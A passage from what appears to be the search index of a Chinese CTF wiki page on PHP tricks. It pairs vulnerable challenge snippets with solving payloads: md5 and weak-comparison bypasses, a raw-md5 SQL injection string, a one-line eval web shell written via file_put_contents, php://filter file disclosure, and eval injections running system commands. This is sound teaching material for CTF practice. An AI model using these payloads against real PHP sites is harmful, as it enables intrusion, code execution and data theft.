\u4e0d\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4ee5php\u5f00\u5934\u4ee5php\u7ed3\u5c3e\u3002\u6240\u4ee5\u65e0\u6cd5\u901a\u8fc7\uff0c\u6700\u540e\u8f93\u51faflag","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u4fee\u9970\u7b26"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#int_val","text":"\u5b98\u65b9\u6587\u6863\u4ecb\u7ecd\u5982\u4e0b\uff1a intval ( mixed $var [, int $base = 10 ] ) : int Note: \u5982\u679c base \u662f 0\uff0c\u901a\u8fc7\u68c0\u6d4b var \u7684\u683c\u5f0f\u6765\u51b3\u5b9a\u4f7f\u7528\u7684\u8fdb\u5236\uff1a \u5982\u679c\u5b57\u7b26\u4e32\u5305\u62ec\u4e86 \"0x\" (\u6216 \"0X\") \u7684\u524d\u7f00\uff0c\u4f7f\u7528 16 \u8fdb\u5236 (hex)\uff1b\u5426\u5219\uff0c \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 \"0\" \u5f00\u59cb\uff0c\u4f7f\u7528 8 \u8fdb\u5236(octal)\uff1b\u5426\u5219\uff0c \u5c06\u4f7f\u7528 10 \u8fdb\u5236 (decimal)\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5 intval('4476.0')===4476 \u5c0f\u6570\u70b9 intval('+4476.0')===4476 \u6b63\u8d1f\u53f7 intval('4476e0')===4476 \u79d1\u5b66\u8ba1\u6570\u6cd5 intval('0x117c')===4476 16\u8fdb\u5236 intval('010574')===4476 8\u8fdb\u5236 intval(' 010574')===4476 8\u8fdb\u5236+\u7a7a\u683c \u4e0b\u9762\u8fd9\u9053\u9898\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684payload\u6267\u884c\uff1a if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } }","title":"Int_val"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#hash","text":"","title":"Hash\u6bd4\u8f83\u7f3a\u9677"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#md5","text":"if (isset($_POST['a']) and isset($_POST['b'])) { if ($_POST['a'] != $_POST['b']) if (md5($_POST['a']) === md5($_POST['b'])) echo $flag; } \u539f\u56e0\uff1amd5()\u51fd\u6570\u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u679c\u4f20\u5165\u7684\u4e3a\u6570\u7ec4\uff0c\u4f1a\u8fd4\u56deNULL\uff0c\u6240\u4ee5\u4e24\u4e2a\u6570\u7ec4\u7ecf\u8fc7\u52a0\u5bc6\u540e\u5f97\u5230\u7684\u90fd\u662fNULL,\u4e5f\u5c31\u662f\u5f3a\u76f8\u7b49\u7684\u3002","title":"md5\u5904\u7406\u6570\u7ec4"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#sha1","text":"\u548c\u4e0a\u9762\u4e00\u6837\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u66f4\u591a\u662f\u8bb0\u5f55\u4e00\u4e0b\u5f31\u6bd4\u8f83\u65f6\u53ef\u7528\u7684\u5b57\u7b26\u4e32 aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m","title":"Sha1\u5904\u7406\u6570\u7ec4"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#md5_1","text":"","title":"md5"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#md5_2","text":"\u5982\u679c\u4e24\u4e2a\u5b57\u7b26\u7ecfMD5\u52a0\u5bc6\u540e\u7684\u503c\u4e3a 0exxxxx\u5f62\u5f0f\uff0c\u5c31\u4f1a\u88ab\u8ba4\u4e3a\u662f\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u4e14\u8868\u793a\u7684\u662f0*10\u7684xxxx\u6b21\u65b9\uff0c\u8fd8\u662f\u96f6\uff0c\u90fd\u662f\u76f8\u7b49\u7684\u3002 \u4e0b\u5217\u7684\u5b57\u7b26\u4e32\u7684MD5\u503c\u90fd\u662f0e\u5f00\u5934\u7684\uff1a QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a \u8fd9\u91cc\u518d\u5206\u4eab\u4e00\u7bc7\u6211\u4ee5\u524d\u8bb0\u5f55\u7684WP\uff1a \u8bb0\u5f55\u4ee5\u540e\u53ef\u80fd\u7528\u5230\u7684MD5 \u8fd9\u91cc\u518d\u8865\u5145\u4e00\u9053\u9898 $a=(string)$a; $b=(string)$b; if( ($a!==$b) && (md5($a)==md5($b)) ){ echo $flag; } md5\u5f31\u6bd4\u8f83\uff0c\u4e3a0e\u5f00\u5934\u7684\u4f1a\u88ab\u8bc6\u522b\u4e3a\u79d1\u5b66\u8bb0\u6570\u6cd5\uff0c\u7ed3\u679c\u5747\u4e3a0\uff0c\u6240\u4ee5\u53ea\u9700\u627e\u4e24\u4e2amd5\u540e\u90fd\u4e3a0e\u5f00\u5934\u4e140e\u540e\u9762\u5747\u4e3a\u6570\u5b57\u7684\u503c\u5373\u53ef\u3002 payload: a=QNKCDZO&b=240610708","title":"md5\u5f31\u6bd4\u8f83(==\u6bd4\u8f83\u6f0f\u6d1e)"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#md5_3","text":"$a=(string)$a; $b=(string)$b; if( ($a!==$b) && (md5($a)===md5($b)) ){ echo $flag; } \u8fd9\u65f6\u5019\u9700\u8981\u627e\u5230\u4e24\u4e2a\u771f\u6b63\u7684md5\u503c\u76f8\u540c\u6570\u636e a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 \u56fd\u5916\u6709\u4e2a\u7f51\u7ad9\u4e5f\u6709\u4e00\u4e9b\u6536\u96c6\u7684\u8d44\u6599\uff1a md5\u5f3a\u78b0\u649e\u6536\u96c6","title":"md5\u5f3a\u78b0\u649e"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#md5strtrue","text":"$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\"; \u5c06\u5bc6\u7801\u8f6c\u6362\u621016\u8fdb\u5236\u7684hex\u503c\u4ee5\u540e\uff0c\u518d\u5c06\u5176\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u540e\u5305\u542b\u2019 \u2018or \u2019 6\u2019 SELECT * FROM admin WHERE pass=\u2019 \u2018or \u2019 6\u2019 \u5f88\u660e\u663e\u53ef\u4ee5\u6ce8\u5165\u4e86\u3002 \u96be\u70b9\u5c31\u5728\u5982\u4f55\u5bfb\u627e\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\uff0c\u7f51\u4e0a\u6709 \u63d0\u4f9b\u4e24\u4e2a\u5b57\u7b26\u4e32\uff1a ffifdyop\u3001129581926211651571912466741651878684928 \u4f46\u9898\u76ee\u6709\u957f\u5ea6\u9650\u5236\uff0c\u6240\u4ee5\u8f93\u5165ffifdyop\u5373\u53ef\u83b7\u53d6flag \u518d\u8f6c\u6210\u5b57\u7b26\u4e32:\u2019 \u2019 \u2018or\u2019 6 \u89e3\u6790:\u5b58\u5728 or \u5373\u4ee3\u7801\u7684\u4e24\u8fb9\u6709\u4e00\u8fb9\u4e3a\u771f\u65e2\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u5176\u5b9e\u4e3a\u5783\u573e\u4ee3\u7801\u6ca1\u6709\u4efb\u4f55\u7528\u7684\u3002 or \u540e\u9762\u67096\uff0c\u975e\u96f6\u503c\u5373\u4e3a\u771f\u3002\u65e2\u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u3002","title":"md5($str,true)\u7c7b\u578b\u7ed5\u8fc7"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#in_array","text":"ctf-show\u4e2d\u7684\u4e00\u9053\u9898 $allow = array(); for ($i=36; $i < 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET['n']) && in_array($_GET['n'], $allow)){ file_put_contents($_GET['n'], $_POST['content']); } \u67e5\u770b\u8fd9\u6837\u4e00\u4e2a\u7ed3\u679c\uff1a $allow = array(1,'2','3'); var_dump(in_array('1.php',$allow));//\u8fd4\u56detrue $allow = array('1','2','3'); var_dump(in_array('1.php',$allow));//\u8fd4\u56defalse in_array\u5ef6\u7528\u4e86php\u4e2d\u7684==\uff0c\u56e0\u4e3a\u65b0\u52a0\u8fdb\u53bb\u7684\u968f\u673a\u6570\u5b57\u6bcf\u6b21\u90fd\u5305\u542b1\uff0c1\u5b58\u5728\u7684\u51e0\u7387\u662f\u6700\u5927\u7684\u3002 payload\uff1a n=1.php post:content=<?php eval($_POST[1]);?> \u5b98\u65b9\u6587\u6863\uff1a PHP \u7c7b\u578b\u6bd4\u8f83\u8868","title":"In_array\u4e2d\u7684\u5f31\u7c7b\u578b\u6bd4\u8f83"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#parse_str","text":"\u5b98\u65b9\u6587\u6863\u7684\u4ecb\u7ecd parse_str \u2014 \u5c06\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u591a\u4e2a\u53d8\u91cf parse_str ( string $encoded_string [, array &$result ] ) : void \u5982\u679c\u8bbe\u7f6e\u4e86\u7b2c\u4e8c\u4e2a\u53d8\u91cf result\uff0c \u53d8\u91cf\u5c06\u4f1a\u4ee5\u6570\u7ec4\u5143\u7d20\u7684\u5f62\u5f0f\u5b58\u5165\u5230\u8fd9\u4e2a\u6570\u7ec4\uff0c\u4f5c\u4e3a\u66ff\u4ee3\u3002 \u90a3\u4e48\u6709\u8fd9\u6837\u4e00\u4e2a\u4f8b\u5b50,\u7b80\u7b80\u5355\u5355\u770b\u4e00\u770b\u5c31\u597d\u4e86 $a='q=123&p=456'; parse_str($a,$b); echo $b['q']; //\u8f93\u51fa123 echo $b['p']; //\u8f93\u51fa456 \u4e3a\u4e86\u52a0\u6df1\u5f71\u54cd\u8fd9\u91cc\u518d\u8865\u5145\u4e00\u4e2a\u7b80\u7b80\u5355\u5355\u7684web\u9898\u76ee if(isset($_POST['v1'])){ $v1 = $_POST['v1']; $v3 = $_GET['v3']; parse_str($v1,$v2); if($v2['flag']==md5($v3)){ echo $flag; } } //\u6240\u4ee5\u8fd9\u4e2a\u9898\u6211\u4eec\u4f20\u5165v1=1 \u7136\u540ev3=flag=c4ca4238a0b923820dcc509a6f75849b \u53731\u7684md5\u503c\u5373\u53ef","title":"parse_str"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#ereg-00","text":"\u6ca1\u5565\u7279\u522b\u597d\u8bb2\u89e3\u7684\uff0c\u4ece\u4e00\u9053web\u9898\u76ee\u5f53\u4e2d\u5f00\u542f\u5b66\u4e60\u5427 if (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE) { die('error'); } //\u53ea\u670936d\u7684\u4eba\u624d\u80fd\u770b\u5230flag if(intval(strrev($_GET['c']))==0x36d){ echo $flag; } //\u8865\u5145\u51fd\u6570 //strrev() \u5b57\u7b26\u4e32\u53cd\u8f6c //intval() \u83b7\u53d6\u53d8\u91cf\u7684\u6574\u6570\u503c //\u672c\u9898payload\uff1ac=a%00778 //\u5907\u6ce8\uff1a\u9996\u5148\u6b63\u5219\u8868\u8fbe\u5f0f\u53ea\u4f1a\u5339\u914d%00\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u540e\u9762\u7684\u88ab\u622a\u65ad\u6389\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u6d4b\uff0c\u540e\u9762\u901a\u8fc7\u53cd\u8f6c\u6210877%00a\uff0c\u518d\u7528intval\u51fd\u6570\u83b7\u53d6\u6574\u6570\u90e8\u5206\u5f97\u5230877\uff0c877\u4e3a0x36d\u768410\u8fdb\u5236\u3002","title":"ereg---%00\u6b63\u5219\u622a\u65ad"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#is_file","text":"","title":"is_file"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#phpis_filehighlight_file","text":"\u4ece\u4e00\u9053ctf\u9898\u76ee\u5b66\u4e60 function filter($file){ if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } \u51fd\u6570\u4ecb\u7ecd\uff1a is_file \u2014 \u5224\u65ad\u7ed9\u5b9a\u6587\u4ef6\u540d\u662f\u5426\u4e3a\u4e00\u4e2a\u6b63\u5e38\u7684\u6587\u4ef6 is_file ( string $filename ) : bool \u90e8\u5206payload\uff1a \u53ef\u4ee5\u76f4\u63a5\u7528\u4e0d\u5e26\u4efb\u4f55\u8fc7\u6ee4\u5668\u7684filter\u4f2a\u534f\u8bae payload:file=php://filter/resource=flag.php \u4e5f\u53ef\u4ee5\u7528\u4e00\u4e9b\u6ca1\u6709\u8fc7\u6ee4\u6389\u7684\u7f16\u7801\u65b9\u5f0f\u548c\u8f6c\u6362\u65b9\u5f0f payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php file=compress.zlib://flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php PHP\u652f\u6301\u7684\u5b57\u7b26\u7f16\u7801 \u5982\u679c\u8fd8\u8fc7\u6ee4\u4e86 filter \u534f\u8bae\u600e\u4e48\u529e\u5462\uff0c\u770b\u4e0b\u4e00\u4e2a","title":"php\u4f2a\u534f\u8bae\u7ed5\u8fc7is_file+highlight_file"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#procselfrootis_file","text":"function filter($file){ if(preg_match('/\\.\\.\\/|http|filter|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php \u8fd8\u6709\u4e00\u4e2a\u91ce\u86ee\u4eba\u7b14\u8bb0 php\u6e90\u7801\u5206\u6790 require_once \u7ed5\u8fc7\u4e0d\u80fd\u91cd\u590d\u5305\u542b\u6587\u4ef6\u7684\u9650\u5236","title":"\u591a\u6b21\u91cd\u590d/proc/self/root\u7ed5\u8fc7is_file"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#php","text":"\u6211\u4eec\u77e5\u9053php\u53d8\u91cf\u547d\u540d\u662f\u4e0d\u5141\u8bb8\u4f7f\u7528\u70b9\u53f7\u7684\uff0c\u4f46\u662f\u7528\u4e86\u70b9\u600e\u4e48\u534a\u5462\uff0c\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u5427 \u5148\u6765\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 \u5f53\u6211\u4eecPOST yyy.yyy=1 \u7684\u65f6\u5019\u88ab\u89e3\u6790\u4e3a [\"yyy_yyy\"]=> string(1) \"1\" \u65e0\u8bba\u540e\u9762\u52a0\u591a\u5c11\u4e2a .yyy \u5b83\u90fd\u4f1a\u88ab\u89e3\u6790\u4e3a _ \uff0c\u4f46\u662f yyy[yyy.yyy=1 \u88ab\u89e3\u6790\u4e3a yyy_yyy.yyy \u8fd9\u4e2a yyy[yyy[yyy=1 \u4e3a yyy_yyy[yyy \u5177\u4f53\u539f\u7406\u4e0d\u6e05\u695a\uff0c\u6ca1\u8bfb\u8fc7php\u6e90\u4ee3\u7801","title":"php\u53d8\u91cf\u540d\u5982\u4f55\u975e\u6cd5\u5b57\u7b26"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_serverargv","text":"1\u3001cli\u6a21\u5f0f\uff08\u547d\u4ee4\u884c\uff09\u4e0b \u7b2c\u4e00\u4e2a\u53c2\u6570$_SERVER['argv'][0]\u662f\u811a\u672c\u540d\uff0c\u5176\u4f59\u7684\u662f\u4f20\u9012\u7ed9\u811a\u672c\u7684\u53c2\u6570 2\u3001web\u7f51\u9875\u6a21\u5f0f\u4e0b \u5728web\u9875\u6a21\u5f0f\u4e0b\u5fc5\u987b\u5728php.ini\u5f00\u542fregister_argc_argv\u914d\u7f6e\u9879 \u8bbe\u7f6eregister_argc_argv = On(\u9ed8\u8ba4\u662fOff) \u8fd9\u65f6\u5019\u7684$_SERVER[\u2018argv\u2019][0] = $_SERVER[\u2018QUERY_STRING\u2019] $argv,$argc\u5728web\u6a21\u5f0f\u4e0b\u4e0d\u9002\u7528 CLI\u6a21\u5f0f\u4e0b\u76f4\u63a5\u628a request info \u2fa5\u2faf\u7684argv\u503c\u590d\u5236\u5230arr\u6570\u7ec4\u4e2d\u53bb \u7ee7\u7eed\u5224\u65adquery string\u662f\u5426\u4e3a\u7a7a\uff0c \u5982\u679c\u4e0d\u4e3a\u7a7a\u628a\u901a\u8fc7+\u7b26\u53f7\u5206\u5272\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u6210php\u5185\u90e8\u7684zend_string\uff0c \u7136\u540e\u518d\u628a\u8fd9\u4e2azend_string\u590d\u5236\u5230 arr \u6570\u7ec4\u4e2d\u53bb\u3002 \u56e0\u6b64\u52a0\u53f7+\u5206\u5272argv\u6210\u591a\u4e2a\u90e8\u5206 \u8fd9\u91cc\u505a\u4e2a\u6d4b\u8bd5 <?php $a = $_SERVER [ 'argv' ]; var_dump ( $a ); http :// localhost : 63342 / myphptest / mytest . php ? _ijt = kbaatem1e97lqblmkrg3lvk83g & a = 1 + yyy = 3 \u5f97\u5230\u7ed3\u679c array ( 2 ) { [ 0 ] => string ( 35 ) \"_ijt=kbaatem1e97lqblmkrg3lvk83g&a=1\" [ 1 ] => string ( 5 ) \"yyy=3\" }","title":"$_SERVER['argv']\u7684\u9a9a\u64cd\u4f5c"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_3","text":"\u8fd8\u662f\u4ece\u4e00\u9053\u9898\u5f53\u4e2d\u8bb2\u89e3,\u4ee3\u7801\u5ba1\u8ba1\uff0c\u9898\u76ee\u4e00\u5171\u6709\u4e09\u4e2a\u53d8\u91cf $error $suces $flag \u6211\u4eec\u53ea\u8981\u4ee4\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u7684\u503c\u4e3aflag\uff0c\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7die\u6216\u8005\u76f4\u63a5echo\u8f93\u51fa\u7684\u3002\u5047\u8bbe $flag=flag{test123} $error='error!'; $suces='success!'; foreach($_GET as $key => $value){ if($key==='error'){ die(\"what are you doing?!\"); } $$key=$$value; }foreach($_POST as $key => $value){ if($value==='flag'){ die(\"what are you doing?!\"); } $$key=$$value; } if(!($_POST['flag']==$flag)){ die($error); } echo \"your are good\".$flag.\"\\n\"; die($suces); \u4e00\u3001\u901a\u8fc7die($error)\u8f93\u51fa `payload:a=flag post: error=a` \u6b64\u65f6 $a=flag{test123};$error=flag{test123}; \u4ece\u800c\u8f93\u51faerror\u4e5f\u5c31\u662f\u8f93\u51faflag \u4e8c\u3001\u901a\u8fc7die($suces) payload:suces=flag&flag= \u6b64\u65f6 $scues=flag{test123};$_POST['flag']=NULL;$flag=NULL \uff0c\u6ee1\u8db3 ($_POST['flag']==$flag)","title":"\u53d8\u91cf\u8986\u76d6"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_4","text":"","title":"\u8865\u5145\u4e00\u4e9b\u5176\u4ed6\u795e\u5947\u59ff\u52bf"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_5","text":"if(isset($_GET['u'])){ if($_GET['u']=='flag.php'){ die(\"no no no\"); }else{ highlight_file($_GET['u']); } } Payload\uff1a \u4e0b\u9762\u65b9\u5f0f\u5728highlight_file\u4e2d\u5747\u7b49\u6548\u4e8eflag.php\uff0c\u4e5f\u5373\u672c\u9898\u7684payload /var/www/html/flag.php \u7edd\u5bf9\u8def\u5f84 ./flag.php \u76f8\u5bf9\u8def\u5f84 php://filter/resource=flag.php php\u4f2a\u534f\u8bae","title":"\u8def\u5f84\u95ee\u9898"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#_6","text":"\u9996\u5148\u770b\u770b\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2a\u4ee3\u7801\uff1a $_GET?$_GET=&$_POST:'flag'; $_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag'; $_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); \u6839\u636e\u7b2c\u4e00\u6761\u53ef\u77e5\uff0c\u5982\u679cget\u4f20\u4e86\u4e00\u4e2a\u503c\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528post\u8986\u76d6get\u4e2d\u7684\u503c\u3002 \u4e2d\u95f4\u4e24\u884c\u610f\u4e49\u4e0d\u5927\u3002 \u6700\u540e\u4e00\u884c\u662f,\u5982\u679cget\u4f20\u4e86\u4e00\u4e2a HTTP_FLAG=flag \u5c31\u8f93\u51fa flag \u5426\u5219\u663e\u793a index.php \u6e90\u7801\u3002 \u6240\u4ee5\u6211\u4eec get \u968f\u4fbf\u4f20\u4e00\u4e2a\uff0c\u7136\u540e post \u4f20 HTTP_FLAG=flag \u5373\u53ef `payload get\uff1a1=1 post\uff1aHTTP_FLAG=flag`","title":"\u4e09\u76ee\u8fd0\u7b97\u7b26\u4e0e\u53d8\u91cf\u8986\u76d6"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#andreflectionclass","text":"$getflag = new getflag(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\;/\", $v2)){ if(preg_match(\"/\\;/\", $v3)){ eval(\"$v2('getflag')$v3\"); } } } \u5176\u5b9e\u4e3b\u8981\u8fd8\u662f\u901a\u8fc7\u8fd9\u9053\u9898\u5b66\u4e60\u4e86php\u7684\u53cd\u5c04\u4ee5\u53caand\u7684\u4e00\u4e9b\u5c0f\u7279\u6027 \u4e0b\u9762\u9996\u5148\u662f\u8bb2 and\u4e0e$$ ,\u6240\u4ee5\u53ea\u9700\u8981\u4fdd\u8bc1\u7b2c\u4e00\u4e2a\u4e3a true \u5373\u53ef <?php $a = true and false and false ; var_dump ( $a ); //\u8fd4\u56detrue $a = true && false && false ; var_dump ( $a ); //\u8fd4\u56defalse \u4e0b\u9762\u6765\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u53cd\u5c04\u7684\u76f8\u5173\u5b9a\u4e49\u4e0e\u51fd\u6570\uff0c\u611f\u89c9 \u5b98\u65b9\u6587\u6863 \u5f88\u8be6\u7ec6,\u81ea\u5df1\u70b9\u5f00\u5b66\u4e60\u4e00\u4e0b\u5373\u53ef \u6240\u4ee5\u5f97\u5230 payload:?v1=1&v2=echo new ReflectionClass&v3=; \u5176\u5b9e\u8fd8\u6709\u5f88\u591a\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fc7\u6ee4\u6bd4\u8f83\u5c11\uff0c\u6bd4\u5982 v1=1&v2=?><?php echo ls ?>/*&v3=;*/ \uff0c\u6216\u8005\u6765\u4e2ainclude\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7\u4e5f\u884c","title":"and\u4e0e&amp;&amp;\u7684\u533a\u522b+\u53cd\u5c04\u7c7bReflectionClass\u7684\u4f7f\u7528"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#and","text":"$a = true and false; var_dump(true and false); var_dump($a); \u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5c45\u7136\u662f\uff1a\uff01\uff01\uff01 bool(false)\uff1a\uff1a\u76f8\u5f53\u4e8e\u662f($a = true) and false; bool(true) \u9644\u4e0a\uff1a \u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7","title":"and\u4f18\u5148\u7ea7"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#php_1","text":"\u8fd8\u662f\u4ecectfshow\u5f53\u4e2d\u4e00\u9053\u9898\u5b66\u4e60 if(isset($_GET['v1']) && isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){ eval(\"echo new $v1($v2());\"); } } \u5148\u6765\u770b\u4e0b\u8fd9\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f /[a-zA-Z]+/ \u5339\u914d \u81f3\u5c11\u6709\u4e00\u4e2a\u5b57\u6bcd \u7684\u5b57\u7b26\u4e32 \u6240\u4ee5\u6211\u4eec\u53ea\u8981\u8ba9new\u540e\u9762\u6709\u4e2a\u7c7b\u4e0d\u62a5\u9519\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u968f\u610f\u6784\u9020\u4e86\u3002\u6211\u4eec\u968f\u4fbf\u627e\u4e2aphp\u4e2d\u7684\u5185\u7f6e\u7c7b\u5e76\u4e14\u53ef\u4ee5\u76f4\u63a5echo\u8f93\u51fa\u7684\u5c31\u53ef\u4ee5\u4e86\u3002 \u4e3e\u4e24\u4e2a\u4f8b\u5b50 Exception ReflectionClass \u7b54\u6848\u4e3e\u4f8b payload: v1=Exception();system('tac f*');//&v2=a v1=ReflectionClass&v2=system('tac f*')","title":"php \u5f02\u5e38\u7c7b"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#filesystemiterator","text":"\u6709\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u51fd\u6570\u904d\u5386\u5f53\u524d\u76ee\u5f55\u6216\u8005\u770b\u60c5\u51b5\u5176\u4ed6\u76ee\u5f55 <?php $a = new FilesystemIterator ( \"../../\" ); while ( $a -> valid ()){ //\u5224\u65ad\u662f\u5426\u5230\u5e95 echo $a -> getFilename () . '\\n' ; $a -> next (); } \u914d\u5408\u4e0b\u9762\u51fd\u6570 getcwd () getcwd \u2014 \u53d6\u5f97\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55 getcwd ( void ) : string","title":"FilesystemIterator\u7c7b\u7684\u4f7f\u7528"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#directoryiteratorglob","text":"\u901a\u5e38\u53ef\u4ee5\u914d\u5408RCE\u4f7f\u7528 <?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f->__toString().' '); } exit(0); ?>","title":"DirectoryIterator\u7c7b\u4e0eglob\u534f\u8bae\u904d\u5386\u76ee\u5f55"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/php/php\u5c0ftricks/#globals","text":"\u9996\u5148\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u8d85\u5168\u5c40\u53d8\u91cf $GLOBALS \u2014 \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf \u4e00\u4e2a\u5305\u542b\u4e86\u5168\u90e8\u53d8\u91cf\u7684\u5168\u5c40\u7ec4\u5408\u6570\u7ec4\u3002\u53d8\u91cf\u7684\u540d\u5b57\u5c31\u662f\u6570\u7ec4\u7684\u952e\u3002 \u8fd8\u662f\u4ece\u4e00\u9053\u7f51\u4e0actf\u9898\u76ee\u8fdb\u884c\u8bb0\u5f55 function getFlag(&$v1,&$v2){ eval(\"$$v1 = &$$v2;\"); var_dump($$v1); } if(isset($_GET['v1']) && isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){ die(\"error v1\"); } 